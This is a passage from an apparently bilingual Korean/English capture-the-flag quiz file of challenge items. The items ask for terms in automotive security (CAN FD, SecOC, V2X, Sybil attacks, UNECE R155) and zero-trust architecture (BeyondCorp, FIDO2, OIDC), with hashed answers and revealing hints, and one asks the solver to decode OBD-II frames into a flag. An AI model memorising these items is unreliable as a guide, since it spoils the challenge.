      ],
      "en": [
        "Global Navigation Satellite System.",
        "Defenses: multi-frequency reception, inertial-sensor fusion, angle-of-arrival checks."
      ]
    }
  }
  ,
  {
    "id": "t3_canfd",
    "tier": 3,
    "cat": "can",
    "track": "automotive",
    "points": 200,
    "ci": true,
    "hash": "c1decdc8ae919581c75ce8fe6b270795d6771c62daed4cc92d316cae0239262e",
    "fmt": "값 그대로 / literal (5글자 / 5 chars)",
    "title": {
      "ko": "더 긴 페이로드",
      "en": "A Longer Payload"
    },
    "prompt": {
      "ko": "2012년 고전 버스의 원 개발사가 내놓은 확장 규격이다. 식별자와 버스 접근 규칙은 그대로지만, 프레임당 데이터가 8바이트에서 최대 64바이트로 늘고 데이터 구간만 더 빠른 비트레이트로 전환된다. 최신 ECU 와 진단은 대부분 이 규격을 쓴다. 이 확장의 이름은? (5글자, 공백 없이)",
      "en": "A 2012 extension of the classic bus by its original creator. The identifiers and the bus-access rules are unchanged, but data per frame grows from 8 bytes to as much as 64, and the data phase alone switches to a faster bitrate. Most recent ECUs and diagnostics use it. Name the extension. (5 characters, no space)"
    },
    "hints": {
      "ko": [
        "버스 이름 뒤에 'Flexible Data-rate'.",
        "BRS(비트레이트 전환)와 ESI(에러 상태 표시) 필드가 추가된다."
      ],
      "en": [
        "The bus name followed by 'Flexible Data-rate'.",
        "It adds the BRS (bit-rate switch) and ESI (error state indicator) fields."
      ]
    }
  }
  ,
  {
    "id": "t3_tara",
    "tier": 3,
    "cat": "telematics",
    "track": "automotive",
    "points": 200,
    "ci": true,
    "hash": "42570c45c81fdb5d1964f9e7aaead823df063412a3ae28ddca46dadb25bf6282",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "위협을 먼저 헤아리기",
      "en": "Weigh the Threats First"
    },
    "prompt": {
      "ko": "자동차 사이버보안 국제표준 ISO/SAE 21434 는 개발 초기에 구조화된 분석을 요구한다: 자산을 나열하고, 위협 시나리오와 공격 경로를 도출하고, 각 위험의 심각도·가능성을 매겨 대응 우선순위를 정한다. 이 활동의 네 글자 약어는?",
      "en": "The automotive cybersecurity standard ISO/SAE 21434 requires a structured analysis early in development: list the assets, derive threat scenarios and attack paths, and rate each risk's severity and likelihood to set treatment priorities. Give the four-letter abbreviation for this activity."
    },
    "hints": {
      "ko": [
        "머리글자는 Threat Analysis and Risk Assessment.",
        "위협 분류에는 STRIDE 를 흔히 빌려 쓴다."
      ],
      "en": [
        "The initials of Threat Analysis and Risk Assessment.",
        "STRIDE is commonly borrowed for the threat classification."
      ]
    }
  }
  ,
  {
    "id": "t3_dtc",
    "tier": 3,
    "cat": "uds",
    "track": "automotive",
    "points": 200,
    "ci": true,
    "hash": "749c19eaea3e42cf520672004ff732875c4d343449b3a1f64f972e9008b6c4b2",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "저장된 고장 코드",
      "en": "Stored Fault Codes"
    },
    "prompt": {
      "ko": "차량이 이상을 감지하면 표준화된 고장 코드(예: `P0301` — 1번 실린더 실화)를 저장한다. OBD-II 서비스 0x03 또는 ISO 14229 서비스 0x19 로 읽고, 서비스 0x04 로 지운다. 정비소 스캐너가 제일 먼저 뽑아 보는 것이다. 이 코드를 부르는 세 글자 약어는?",
      "en": "When a vehicle detects a fault it stores a standardized code (e.g. `P0301` — cylinder 1 misfire). You read them with OBD-II service 0x03 or ISO 14229 service 0x19, and clear them with service 0x04. It is the first thing a workshop scanner pulls. Give the three-letter abbreviation for these codes."
    },
    "hints": {
      "ko": [
        "Diagnostic Trouble Code.",
        "첫 글자: P 파워트레인, B 바디, C 섀시, U 네트워크."
      ],
      "en": [
        "Diagnostic Trouble Code.",
        "First letter: P powertrain, B body, C chassis, U network."
      ]
    }
  }
  ,
  {
    "id": "t4_cancapstone",
    "tier": 4,
    "cat": "uds",
    "track": "automotive",
    "points": 250,
    "ci": false,
    "hash": "6599a6e444faa0cb5e7968b5a9093ce468dee99c316bf915dd7f4f07122176bc",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "두 응답을 읽어라",
      "en": "Read Both Replies"
    },
    "prompt": {
      "ko": "아래는 OBD-II 스캔 세션의 응답 프레임들이다. 응답은 `7E8` 로 오고, 형식은 `[길이][0x41][PID][데이터…]` 다.\n\n```\n(12.100) vcan0 7E8#03410D4B00000000\n(12.140) vcan0 7E8#04410C0FA0000000\n(12.180) vcan0 7E8#0341050550000000\n```\n\nPID 0x0D(차속)의 데이터 바이트는 그대로 km/h 다. PID 0x0C(회전수)의 두 데이터 바이트 A, B 는 (A×256+B)÷4 rpm 이다. 두 값을 읽어 `FLAG{SPEED<kmh>_RPM<rpm>}` 형태로 제출하라. 예: 차속 30, 회전수 900 → `FLAG{SPEED30_RPM900}`.",
      "en": "Below are reply frames from an OBD-II scan session. Replies come on `7E8`, formatted `[length][0x41][PID][data…]`.\n\n```\n(12.100) vcan0 7E8#03410D4B00000000\n(12.140) vcan0 7E8#04410C0FA0000000\n(12.180) vcan0 7E8#0341050550000000\n```\n\nThe data byte for PID 0x0D (vehicle speed) is km/h as-is. The two data bytes A, B for PID 0x0C (engine revs) give (A×256+B)÷4 rpm. Read both and submit `FLAG{SPEED<kmh>_RPM<rpm>}`. Example: speed 30, revs 900 → `FLAG{SPEED30_RPM900}`."
    },
    "hints": {
      "ko": [
        "관심 있는 프레임은 `41 0D ..` 와 `41 0C .. ..` 두 개다.",
        "`0x4B` 를 10진수로; 회전수는 `0x0F`, `0xA0` 두 바이트."
      ],
      "en": [
        "The two frames that matter are `41 0D ..` and `41 0C .. ..`.",
        "Convert `0x4B` to decimal; the revs use the two bytes `0x0F` and `0xA0`."
      ]
    }
  }
  ,
  {
    "id": "t4_j1939",
    "tier": 4,
    "cat": "can",
    "track": "automotive",
    "points": 250,
    "ci": true,
    "hash": "08b815c73fc74e0ec34a336c52482bb6d1cc7aee7e5dada0594326a1eb2e1832",
    "fmt": "숫자 / number",
    "title": {
      "ko": "트럭용 상위 프로토콜",
      "en": "The Protocol for Trucks"
    },
    "prompt": {
      "ko": "상용차(트럭·버스)는 CAN 위에 J1939 프로토콜을 얹어 확장 식별자를 쓴다. 그 식별자 안에는 매개변수 그룹 번호(PGN)가 들어 있는데, 어떤 브로드캐스트 메시지의 PGN 이 16진수로 `0xF004` (엔진 토크·속도) 였다. 이 PGN 을 10진수로 나타내면? (숫자)",
      "en": "Commercial vehicles (trucks, buses) run the J1939 protocol on top of CAN, using its extended identifiers. Inside such an identifier sits a Parameter Group Number (PGN); for one broadcast message the PGN was `0xF004` in hex (engine torque and speed). Write that PGN in base ten. (a number)"
    },
    "hints": {
      "ko": [
        "0xF004 = F×4096 + 0×256 + 0×16 + 4.",
        "= 15 × 4096 + 4."
      ],
      "en": [
        "0xF004 = F×4096 + 0×256 + 0×16 + 4.",
        "= 15 × 4096 + 4."
      ]
    }
  }
  ,
  {
    "id": "t4_secoc",
    "tier": 4,
    "cat": "uds",
    "track": "automotive",
    "points": 250,
    "ci": true,
    "hash": "8f1b29ab77ec4176488f61c9ce62fd9249e68a5eb05e784dc4a6a38992bf4e3b",
    "fmt": "값 그대로 / literal (5글자 / 5 chars)",
    "title": {
      "ko": "프레임에 서명을",
      "en": "Signing the Frame"
    },
    "prompt": {
      "ko": "한 자동차 소프트웨어 표준은 CAN 처럼 인증이 없는 버스 위에서, 선택된 메시지마다 대칭키 기반 잘린 MAC 과 매번 증가하는 재생 방지 값을 함께 붙이는 계층을 정의한다. 수신 ECU 는 둘 다 맞을 때만 메시지를 받아들인다. 이 계층의 다섯 글자 이름은?",
      "en": "One automotive software standard defines a layer that, on an unauthenticated bus like CAN, attaches to each selected message a symmetric-key truncated MAC together with a value that increments every time, to stop replay. The receiving ECU accepts a message only when both check out. Give the layer's five-letter name."
    },
    "hints": {
      "ko": [
        "Secure Onboard Communication 을 줄인 이름 — 대문자로 S, e, C, O, C.",
        "키는 별도 보안 하드웨어에 두고, 4바이트로 잘린 MAC 이 흔하다."
      ],
      "en": [
        "A contraction of Secure Onboard Communication — capitalised S, e, C, O, C.",
        "Keys sit in dedicated security hardware; a MAC truncated to 4 bytes is common."
      ]
    }
  }
  ,
  {
    "id": "t4_bsm",
    "tier": 4,
    "cat": "telematics",
    "track": "automotive",
    "points": 250,
    "ci": true,
    "hash": "b8b42d30bdeb0fda93dadac5bcd6888975644b277000f9885d939c27226bec4c",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "10Hz로 외치는 내 위치",
      "en": "My Position, Ten Times a Second"
    },
    "prompt": {
      "ko": "V2X(차량-사물 통신)에서 각 차량은 약 10Hz로 자신의 위치·속도·진행 방향·크기를 짧은 메시지로 방송한다. 주변 차량은 이를 모아 충돌을 예측한다. 공격자가 가짜 메시지를 뿌리면 존재하지 않는 유령 차량을 만들어 급제동을 유도할 수 있다. DSRC(미국)에서 이 핵심 메시지를 부르는 세 글자 약어는?",
      "en": "In V2X (vehicle-to-everything), each vehicle broadcasts a short message about its position, speed, heading and size at roughly 10 Hz. Nearby vehicles gather these to predict collisions. An attacker who sprays fake ones can conjure a phantom vehicle that does not exist and trigger hard braking. Give the three-letter abbreviation for this core message in DSRC (US)."
    },
    "hints": {
      "ko": [
        "Basic Safety Message.",
        "유럽 ETSI 에서는 CAM(Cooperative Awareness Message) 이라 부른다."
      ],
      "en": [
        "Basic Safety Message.",
        "In Europe (ETSI) it is called the CAM, Cooperative Awareness Message."
      ]
    }
  }
  ,
  {
    "id": "t4_scms",
    "tier": 4,
    "cat": "telematics",
    "track": "automotive",
    "points": 250,
    "ci": true,
    "hash": "7d38360b4b0a1be035646a6e951066ad641bb61f54fc1efc848e5340305c43ae",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "익명 인증서를 발급하고 폐기하는 곳",
      "en": "Where Anonymous Certs Are Issued and Revoked"
    },
    "prompt": {
      "ko": "V2X 메시지는 서명되어야 하지만 고정된 인증서를 쓰면 차량이 추적된다. 그래서 미국 V2X 는 전용 PKI 를 두어 차량마다 자주 바뀌는 단기 익명 인증서 다발을 발급하고, 거짓 메시지를 보내는 오동작 차량을 탐지해 그 인증서를 폐기한다. 이 관리 체계의 네 글자 약어는?",
      "en": "V2X messages must be signed, but a fixed certificate lets a vehicle be tracked. So the US V2X system runs a dedicated PKI that issues each vehicle a batch of frequently-rotating short-lived anonymous certificates, and detects vehicles sending false messages so it can revoke theirs. Give the four-letter abbreviation for this management system."
    },
    "hints": {
      "ko": [
        "Security Credential Management System.",
        "구성요소: 등록 CA, 익명 CA, 오동작 판정 기관."
      ],
      "en": [
        "Security Credential Management System.",
        "Its parts: an enrollment CA, a pseudonym CA, a misbehavior authority."
      ]
    }
  }
  ,
  {
    "id": "t4_sybil",
    "tier": 4,
    "cat": "telematics",
    "track": "automotive",
    "points": 250,
    "ci": true,
    "hash": "a832e6b2ee33c8e0c1a9e77bb4e9dd70bd4918ada3aee036b589efe69182c30d",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "한 대가 여러 대인 척",
      "en": "One Car Pretending to Be Many"
    },
    "prompt": {
      "ko": "한 대의 악성 V2X 장치가 서로 다른 차량 식별자 수십 개를 동시에 만들어 내, 텅 빈 도로에 가상의 교통 정체를 지어내거나 반대로 교차로를 강제로 비우게 만든다. 여러 개의 가짜 정체성으로 분산 시스템의 다수결·평판을 뒤엎는 이 공격 유형의 이름은? (한 단어)",
      "en": "A single malicious V2X device fabricates dozens of distinct vehicle identities at once, inventing a virtual traffic jam on an empty road or, the other way, forcing an intersection to clear. Name this class of attack — overturning a distributed system's majority vote or reputation with many fake identities. (one word)"
    },
    "hints": {
      "ko": [
        "다중 인격을 다룬 1973년 소설이자 영화의 제목에서 왔다.",
        "방어: 위치·시각 검증, 신호 도래각, 하드웨어에 묶인 인증서."
      ],
      "en": [
        "Named after a 1973 novel and film about multiple personalities.",
        "Defenses: position and time checks, angle-of-arrival, hardware-bound certificates."
      ]
    }
  }
  ,
  {
    "id": "t4_r155",
    "tier": 4,
    "cat": "telematics",
    "track": "automotive",
    "points": 250,
    "ci": true,
    "hash": "994f725225739441e53a86aaaff99b6636f8cbccfa8cf3eb40f8a7cae0fa5114",
    "fmt": "값 그대로 / literal (4글자 / 4 chars)",
    "title": {
      "ko": "형식 승인의 전제조건",
      "en": "A Precondition for Type Approval"
    },
    "prompt": {
      "ko": "2021년 발효된 UNECE 규정으로, 약 60개국에서 신차 형식 승인을 받으려면 제조사가 인증된 사이버보안 관리체계(CSMS)를 갖추고 차량 수명 주기 전체에 걸쳐 위협을 관리함을 증명해야 한다. ISO/SAE 21434 가 그 기술적 이행 수단이다. 이 규정의 짧은 표기는? (R 뒤에 숫자 세 자리)",
      "en": "A UNECE regulation in force since 2021: to get type approval for a new vehicle in about 60 countries, a maker must have a certified Cyber Security Management System (CSMS) and show it manages threats across the whole vehicle lifecycle. ISO/SAE 21434 is the technical means of meeting it. Give the regulation's short designation. (R followed by three digits)"
    },
    "hints": {
      "ko": [
        "짝을 이루는 규정 R156 은 소프트웨어 업데이트 관리체계(SUMS)를 다룬다.",
        "WP.29 산하에서 만들어졌다."
      ],
      "en": [
        "Its sibling regulation R156 covers a Software Update Management System (SUMS).",
        "Drafted under WP.29."
      ]
    }
  }
  ,
  {
    "id": "t4_hsm",
    "tier": 4,
    "cat": "ecu",
    "track": "automotive",
    "points": 250,
    "ci": true,
    "hash": "2e6cd7ebeba70c8a4c4741e6bf70b518d310b305b6b93d43c5d6319c9042e2ef",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "ECU 안의 금고",
      "en": "A Safe Inside the ECU"
    },
    "prompt": {
      "ko": "최신 ECU 는 서명 키와 암호 연산을 메인 코어에서 떼어 낸 변조 방지 하드웨어 블록에 맡긴다. 키는 이 블록 밖으로 절대 나오지 않고, 부팅 시 펌웨어 서명 검증과 보안 통신 MAC 계산을 이 안에서 한다. EVITA 프로젝트가 자동차용 프로파일(light·medium·full)을 정의했다. 이 하드웨어 블록의 세 글자 약어는?",
      "en": "A modern ECU offloads its signing keys and crypto operations to a tamper-resistant hardware block separated from the main core. Keys never leave the block; firmware-signature checks at boot and secure-communication MAC computation happen inside it. The EVITA project defined automotive profiles for it (light, medium, full). Give the three-letter abbreviation for this hardware block."
    },
    "hints": {
      "ko": [
        "Hardware Security Module.",
        "PC·서버의 TPM 과 목적이 비슷하지만 자동차 실시간 요구에 맞춘 축소판이다."
      ],
      "en": [
        "Hardware Security Module.",
        "Similar in purpose to a PC/server TPM, but a trimmed version for automotive real-time needs."
      ]
    }
  }
  ,
  {
    "id": "t4_autosar",
    "tier": 4,
    "cat": "ecu",
    "track": "automotive",
    "points": 250,
    "ci": true,
    "hash": "c9a19b5ab6a7f7dbc870c590582418898b6107e6f1e1844aef5647c70f27c98d",
    "fmt": "값 그대로 / literal (7글자 / 7 chars)",
    "title": {
      "ko": "공급사가 함께 쓰는 뼈대",
      "en": "The Skeleton Suppliers Share"
    },
    "prompt": {
      "ko": "대부분의 자동차 ECU 소프트웨어는 완성차·부품사 컨소시엄이 정한 표준 계층 아키텍처 위에 올라간다. 애플리케이션 계층 아래에 런타임 환경(RTE)과 기본 소프트웨어(BSW)를 두어, 통신·진단·암호 스택·보안 통신 계층을 하드웨어와 무관하게 재사용한다. 이 아키텍처의 일곱 글자 이름은?",
      "en": "Most automotive ECU software sits on a standard layered architecture defined by a consortium of carmakers and suppliers. Below the application layer it puts a runtime environment (RTE) and basic software (BSW), so the communication, diagnostics, crypto stack and the secure-communication layer are reused independently of the hardware. Give the architecture's seven-letter name."
    },
    "hints": {
      "ko": [
        "AUTomotive Open System ARchitecture 의 축약.",
        "Classic 플랫폼은 OSEK 계열 RTOS, Adaptive 플랫폼은 POSIX 기반이다."
      ],
      "en": [
        "A contraction of AUTomotive Open System ARchitecture.",
        "The Classic platform uses an OSEK-family RTOS; the Adaptive platform is POSIX-based."
      ]
    }
  }
  ,
  {
    "id": "t4_tcu",
    "tier": 4,
    "cat": "telematics",
    "track": "automotive",
    "points": 250,
    "ci": true,
    "hash": "6cfc5e6ffb375b3a1d26631c4fe61e7a2f03ee1d5b4ba69d75febaa8f484e72d",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "인터넷으로 열린 창",
      "en": "The Window to the Internet"
    },
    "prompt": {
      "ko": "차량에서 셀룰러 모뎀(4G/5G), GPS 수신기, Wi-Fi, 때로는 이심(eSIM)까지 담아 차량을 외부 네트워크에 연결하는 상자다. 원격 진단, 긴급통보, 무선 펌웨어 갱신이 모두 여기를 지난다. 내부적으로 CAN 버스에 물려 있어, 원격 공격자에게는 차량 내부로 들어가는 첫 발판이 된다. 이 유닛의 세 글자 약어는?",
      "en": "A box in the vehicle carrying a cellular modem (4G/5G), a GPS receiver, Wi-Fi and sometimes an eSIM, connecting the vehicle to outside networks. Remote diagnostics, emergency calls and wireless firmware updates all pass through it. Internally it is wired into the CAN bus, so for a remote attacker it is the first foothold into the vehicle. Give the three-letter abbreviation for this unit."
    },
    "hints": {
      "ko": [
        "Telematics Control Unit.",
        "인포테인먼트 헤드유닛과는 별개 모듈인 경우가 많다."
      ],
      "en": [
        "Telematics Control Unit.",
        "Often a separate module from the infotainment head unit."
      ]
    }
  },
  {
    "id": "t0_ztverify",
    "tier": 0,
    "cat": "policy",
    "track": "zerotrust",
    "points": 50,
    "ci": true,
    "hash": "a12dd3a7fd3203a452eb34d91a9be20569d5e337a3384347068895c07f3e0c5a",
    "fmt": "한 단어 / one word (6글자 / 6 chars)",
    "title": {
      "ko": "좌우명의 뒷말",
      "en": "The Other Half of the Motto"
    },
    "prompt": {
      "ko": "제로 트러스트를 한 줄로 요약하는 좌우명이 있다: \"절대 신뢰하지 말고, 항상 ___하라(Never trust, always ___).\" 내부 IP든 회사 장비든 자동으로 믿지 않고, 모든 접근 요청을 매번 다시 확인한다는 뜻이다. 빈칸에 들어갈 영어 한 단어는?",
      "en": "Zero trust boils down to one motto: \"Never trust, always ___.\" Nothing is trusted automatically — not an internal IP, not a corporate laptop — and every access request is checked again, every time. What one English word fills the blank?"
    },
    "hints": {
      "ko": [
        "여섯 글자, -y 로 끝난다.",
        "\"확인/검증\"이라는 뜻."
      ],
      "en": [
        "Six letters, ends in -y.",
        "It means to check or confirm."
      ]
    }
  },
  {
    "id": "t0_ztmoat",
    "tier": 0,
    "cat": "segmentation",
    "track": "zerotrust",
    "points": 50,
    "ci": true,
    "hash": "edf1eb932299d2c1e3c973f57e454fbdf5aceeed86bae113708c69d9adc737f4",
    "fmt": "한 단어 / one word (4글자 / 4 chars)",
    "title": {
      "ko": "성과 해자",
      "en": "Castle and What"
    },
    "prompt": {
      "ko": "제로 트러스트가 대체하려는 전통적 경계 보안 모델에는 별칭이 있다. 성벽(방화벽) 하나만 넘으면 내부는 자유롭게 돌아다닐 수 있다는 구조를 중세 성에 빗대어 \"성과 ___(castle-and-___)\" 모델이라 부른다. 성을 둘러싼 물웅덩이를 가리키는 영어 한 단어를 쓰라.",
      "en": "The traditional perimeter model that zero trust replaces has a nickname. Because crossing one wall (the firewall) lets you roam freely inside, it is likened to a medieval castle: the \"castle-and-___\" model. Give the one English word for the water-filled ditch around a castle."
    },
    "hints": {
      "ko": [
        "네 글자.",
        "성을 둘러싼 물 도랑."
      ],
      "en": [
        "Four letters.",
        "The water-filled ditch encircling a castle."
      ]
    }
  },
  {
    "id": "t1_ztbeyondcorp",
    "tier": 1,
    "cat": "ztna",
    "track": "zerotrust",
    "points": 65,
    "ci": true,
    "hash": "8bfcd1ca63982a856117239fcd93bca1bb5a26f10f62bf9eb2b0192d11748f7b",
    "fmt": "한 단어 / one word (10글자 / 10 chars)",
    "title": {
      "ko": "VPN 없는 회사",
      "en": "The Company Without a VPN"
    },
    "prompt": {
      "ko": "구글은 2009년 Operation Aurora 공격을 겪은 뒤, 직원이 VPN 없이 어디서든 안전하게 일할 수 있는 모델을 만들었다. 접근은 네트워크 위치가 아니라 사용자 신원과 기기 상태로 결정되고, 사내 앱은 인터넷에 그대로 노출된다. 이 모델의 이름은?",
      "en": "After the 2009 Operation Aurora attack, Google built a model letting staff work securely from anywhere with no VPN. Access is decided by user identity and device state, not network location, and internal apps sit directly on the internet. What is this model called?"
    },
    "hints": {
      "ko": [
        "구글이 논문 시리즈로 2014–2020년에 공개했다.",
        "\"Beyond\" + 회사(corp)."
      ],
      "en": [
        "Google published it as a paper series, 2014-2020.",
        "\"Beyond\" + the corporation."
      ]
    }
  },
  {
    "id": "t1_ztmicro",
    "tier": 1,
    "cat": "segmentation",
    "track": "zerotrust",
    "points": 65,
    "ci": true,
    "hash": "18f4b7d4baa29fa62e19a10863c98a7e3b99bc647f6057361997ce4276edac50",
    "fmt": "한 단어 / one word (17글자 / 17 chars)",
    "title": {
      "ko": "같은 서브넷도 못 믿는다",
      "en": "Not Even the Same Subnet"
    },
    "prompt": {
      "ko": "전통적인 네트워크 계층 분리는 서브넷 단위로만 나눠서, 같은 서브넷 안에서는 서버끼리 자유롭게 통신한다. 제로 트러스트는 워크로드·프로세스 수준까지 격리해 같은 서브넷에 있어도 허용된 포트·방향만 통과시킨다. 침해된 호스트에서 옆 호스트로 넘어가는 것을 근본적으로 막는 이 세분화 기법의 이름은?",
      "en": "Traditional network-layer separation only divides by subnet, so servers inside one subnet talk freely. Zero trust isolates down to the workload and process level, so even same-subnet hosts only pass the ports and directions explicitly allowed. What is this segmentation technique called that fundamentally stops an attacker crossing from a compromised host to the next?"
    },
    "hints": {
      "ko": [
        "\"micro\" + \"segmentation\", 한 단어로.",
        "Calico·Cilium·VMware NSX 가 구현한다."
      ],
      "en": [
        "\"micro\" + \"segmentation\", one word.",
        "Implemented by Calico, Cilium, VMware NSX."
      ]
    }
  },
  {
    "id": "t1_ztfido",
    "tier": 1,
    "cat": "identity",
    "track": "zerotrust",
    "points": 65,
    "ci": true,
    "hash": "0ffb8f7c7e3e199f6c5b96a026d5a06be9f78696938518de231990d15827e506",
    "fmt": "값 그대로 / literal (5글자 / 5 chars)",
    "title": {
      "ko": "피싱이 안 통하는 인증",
      "en": "Auth That Phishing Can't Touch"
    },
    "prompt": {
      "ko": "SMS 일회용 코드는 SIM 스와핑에 뚫리고, 사용자는 가짜 사이트에도 코드를 넣는다. 이를 막는 피싱 저항(phishing-resistant) 다중 인증 표준은 WebAuthn(브라우저–서버)과 CTAP2(인증자–클라이언트)로 구성되며, 개인키는 기기를 떠나지 않고 서명은 도메인에 묶인다. 패스키(passkey)의 기반이 되는 이 표준의 이름은? (버전 숫자 포함)",
      "en": "SMS one-time codes fall to SIM swapping, and users type codes into fake sites too. The phishing-resistant multi-factor standard that stops this is built from WebAuthn (browser-server) and CTAP2 (authenticator-client); the private key never leaves the device and the signature is bound to the domain. Name this standard that passkeys are built on (include the version digit)."
    },
    "hints": {
      "ko": [
        "FIDO Alliance 가 만들었다. 이름 뒤에 숫자 2 가 붙는다.",
        "\"Fast IDentity Online\" + \"2\"."
      ],
      "en": [
        "Made by the FIDO Alliance. A digit 2 follows the name.",
        "\"Fast IDentity Online\" + \"2\"."
      ]
    }
  },
  {
    "id": "t1_ztsaml",
    "tier": 1,
    "cat": "identity",
    "track": "zerotrust",
    "points": 65,
    "ci": true,
    "hash": "78e43414e3135d34e45890a645b72dcd996ed45cf3548220220eb67a87bc2a7f",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "XML로 로그인 넘기기",
      "en": "Handing Off Login in XML"
    },
    "prompt": {
      "ko": "엔터프라이즈 SSO 에서 서비스 제공자(SP)와 신원 제공자(IdP)는 XML 로 서명된 어서션(assertion)을 주고받아 사용자를 인증한다. 무겁고 모바일·API 에는 잘 안 맞지만 B2B 웹앱에서 여전히 지배적인, 이 XML 기반 인증·인가 표준의 네 글자 약어는?",
      "en": "In enterprise SSO, the Service Provider (SP) and Identity Provider (IdP) exchange XML-signed assertions to authenticate a user. Heavy and a poor fit for mobile/APIs, but still dominant for B2B web apps. Give the four-letter acronym for this XML-based authentication/authorization standard."
    },
    "hints": {
      "ko": [
        "\"Security Assertion Markup Language\".",
        "OAuth·OpenID Connect 와 함께 자주 비교된다."
      ],
      "en": [
        "\"Security Assertion Markup Language\".",
        "Often compared alongside OAuth and OpenID Connect."
      ]
    }
  },
  {
    "id": "t1_ztoidc",
    "tier": 1,
    "cat": "identity",
    "track": "zerotrust",
    "points": 65,
    "ci": true,
    "hash": "4dcdefd0d389cd15882de8a808334bb06a586b7a74fd0932d0e13fdb945e223c",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "OAuth 위에 얹은 신원",
      "en": "Identity Layered on Top of OAuth"
    },
    "prompt": {
      "ko": "OAuth 2.0 은 \"이 앱이 당신의 데이터에 접근해도 됩니까?\"라는 권한 위임만 다룬다. 그 위에 얇게 얹어 \"당신이 누구인지\"를 표준화한 인증 계층이 있다. iss·sub·aud·exp 같은 클레임을 담은 서명 토큰(ID 토큰)을 발급하며, 현대 웹·모바일 로그인의 사실상 표준이다. 이 네 글자 약어는?",
      "en": "OAuth 2.0 only handles authorization delegation — \"is it OK for this app to access your data?\". A thin authentication layer sits on top of it, standardizing \"who you are\". It issues a signed token (the ID token) carrying claims like iss, sub, aud and exp, and is the de facto standard for modern web/mobile login. Give the four-letter acronym."
    },
    "hints": {
      "ko": [
        "\"OpenID Connect\".",
        "\"Sign in with Google\" 뒤에서 도는 프로토콜."
      ],
      "en": [
        "\"OpenID Connect\".",
        "The protocol behind \"Sign in with Google\"."
      ]
    }
  },
  {
    "id": "t1_ztew",
    "tier": 1,
    "cat": "segmentation",
    "track": "zerotrust",
    "points": 65,
    "ci": true,
    "hash": "94a49a6234ecdbe75b086d8e009a9bdd4d1124bc3144fab96a5177660b194eeb",
    "fmt": "한 단어 / one word (9글자 / 9 chars, - 포함 / include -)",
    "title": {
      "ko": "내부에서 옆으로 흐르는 트래픽",
      "en": "Traffic That Flows Sideways"
    },
    "prompt": {
      "ko": "경계 방화벽이 지키는 것은 인터넷↔내부의 남북(north-south) 트래픽이다. 그러나 현대 기업 트래픽의 75–80% 는 내부 서버끼리 오가는 트래픽이고, 침해 후 옆 호스트로 넘어가는 이동도 이 트래픽을 탄다. 경계 방화벽이 볼 수 없는 이 내부 서버 간 트래픽을 부르는, 방위를 딴 하이픈 단어는?",
      "en": "A perimeter firewall guards north-south traffic (internet to internal). But 75-80% of modern enterprise traffic runs server-to-server inside, and an attacker's post-breach hop to the next host rides it too. What hyphenated compass term names this inter-server traffic that a perimeter firewall never sees?"
    },
    "hints": {
      "ko": [
        "남북(north-south)의 반대 방향.",
        "\"동-서\", 하이픈으로 이어 쓴다."
      ],
      "en": [
        "The opposite axis to north-south.",
        "\"east\" and \"west\", joined with a hyphen."
      ]
    }
  },
  {
    "id": "t2_ztpep",
    "tier": 2,
    "cat": "policy",
    "track": "zerotrust",
    "points": 90,
    "ci": true,
    "hash": "3d66f74fd48822744da1ff290dd7c6b3c664f833e0aaca3671f93eefbf0ba6c4",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "결정을 집행하는 문지기",
      "en": "The Gate That Enforces the Verdict"
    },
    "prompt": {
      "ko": "표준 참조 제로 트러스트 아키텍처는 접근 통제를 둘로 나눈다. 한쪽 컴포넌트가 허용/거부를 판단하면, 리소스 바로 앞에 서서 그 판단을 실제로 강제하는 다른 컴포넌트가 있다. 연결을 열거나 끊는 이 집행 지점의 세 글자 약어는?",
      "en": "The standard reference zero trust architecture splits access control in two. One component decides allow or deny; another stands right in front of the resource and actually enforces that ruling, opening or cutting the connection. Give the three-letter acronym for this enforcement point."
    },
    "hints": {
      "ko": [
        "\"Policy ___ Point\" — P.E.P.",
        "판단(decision)과 집행(enforcement) 중 집행 쪽."
      ],
      "en": [
        "\"Policy ___ Point\" - P.E.P.",
        "Of decision vs enforcement, this is enforcement."
      ]
    }
  },
  {
    "id": "t2_ztjit",
    "tier": 2,
    "cat": "identity",
    "track": "zerotrust",
    "points": 90,
    "ci": true,
    "hash": "ec03a0a8851d9cf0aa2320035b8699d6d3bbb4a8a8c160b0dd41c5c5ed086f9c",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "필요할 때만 잠깐",
      "en": "Only When Needed, Only For a Moment"
    },
    "prompt": {
      "ko": "관리자 권한을 상시 부여해 두면 계정 하나가 뚫릴 때 피해가 크다. 대신 \"DB 서버에 10분만 관리자 권한\"처럼 요청·승인 시 임시 토큰을 짧은 TTL 로 발급하고 만료되면 자동 회수한다. 이 접근 방식의 세 글자 약어는?",
      "en": "Standing always-on admin rights mean a single compromised account does a lot of damage. Instead, on request and approval you issue a temporary token with a short TTL — \"admin on the DB server for 10 minutes\" — auto-revoked on expiry. Give the three-letter acronym for this approach."
    },
    "hints": {
      "ko": [
        "\"Just-In-Time\".",
        "PAM 도구(CyberArk, Entra PIM)가 제공한다."
      ],
      "en": [
        "\"Just-In-Time\".",
        "Provided by PAM tools (CyberArk, Entra PIM)."
      ]
    }
  },
  {
    "id": "t2_ztpkce",
    "tier": 2,
    "cat": "identity",
    "track": "zerotrust",
    "points": 90,
    "ci": true,
    "hash": "ca74bea00c269f053d5ac8df6f09be5b1e86f973195de3fd98e4a1e9838ce8e0",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "가로챈 코드를 못 쓰게",
      "en": "Making a Stolen Code Useless"
    },
    "prompt": {
